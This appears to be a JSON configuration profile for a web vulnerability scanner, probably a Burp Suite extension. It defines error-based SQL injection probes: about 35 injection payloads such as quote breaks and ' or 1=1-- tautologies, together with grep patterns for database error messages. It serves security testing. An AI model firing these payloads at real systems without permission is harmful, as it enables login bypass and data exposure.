[{"Name":"Example_ErrorSQLi",
"Active":true,
"Scanner":1,
"Author":"@egarme",
"Payloads":["\u0027-\u0027",
"\u0027 \u0027",
"\u0027\u0026\u0027",
"\u0027^\u0027",
"\u0027*\u0027",
"\u0027 or \u0027\u0027-\u0027",
"\u0027 or \u0027\u0027 \u0027",
"\u0027 or \u0027\u0027\u0026\u0027",
"\u0027 or \u0027\u0027^\u0027",
"\u0027 or \u0027\u0027*\u0027",
"\"-\"",
"\" \"",
"\"\u0026\"",
"\"^\"",
"\"*\"",
"\" or \"\"-\"",
"\" or \"\" \"",
"\" or \"\"\u0026\"",
"\" or \"\"^\"",
"\" or \"\"*\"",
"or true--",
"\" or true--",
"\u0027 or true--",
"\") or true--",
"\u0027) or true--",
"\u0027 or \u0027x\u0027\u003d\u0027x",
"\u0027) or (\u0027x\u0027)\u003d(\u0027x",
"\u0027)) or ((\u0027x\u0027))\u003d((\u0027x",
"\" or \"x\"\u003d\"x",
"\") or (\"x\")\u003d(\"x",
"\")) or ((\"x\"))\u003d((\"x",
"or 1\u003d1",
"or 1\u003d1-- ",
"or 1\u003d1#",
"or 1\u003d1/*"],
"Encoder":[],
"UrlEncode":false,
"CharsToUrlEncode":"",
"Grep":["Microsoft OLE DB Provider for ODBC Drivers error",
"You have an error in your SQL syntax",
"ORA-00933: SQL command not properly ended",
"Microsoft SQL Native Client error",
"Query failed: ERROR: syntax error at or near"],
"PayloadResponse":false,
"NotResponse":false,
"NotCookie":false,
"TimeOut":"0",
"isTime":false,
"CaseSensitive":false,
"isReplace":false,
"Replace1":"",
"Replace2":"",
"ExcludeHTTP":true,
"OnlyHTTP":false,
"IsContentType":false,
"ContentType":"",
"NegativeCT":false,
"IsResponseCode":false,
"ResponseCode":"",
"NegativeRC":false,
"MatchType":1,
"RedirType":4,
"MaxRedir":5,
"rCookies":false,
"spaceEncode":true,
"payloadPosition":2,
"sEncode":"%20",
"payloadsFile":"",
"grepsFile":"",
"IssueName":"Error_SQLi",
"IssueSeverity":"High",
"IssueConfidence":"Certain",
"IssueDetail":"Error SQLi with payload:   \u003cgrep\u003e",
"RemediationDetail":"",
"IssueBackground":"",
"RemediationBackground":""}]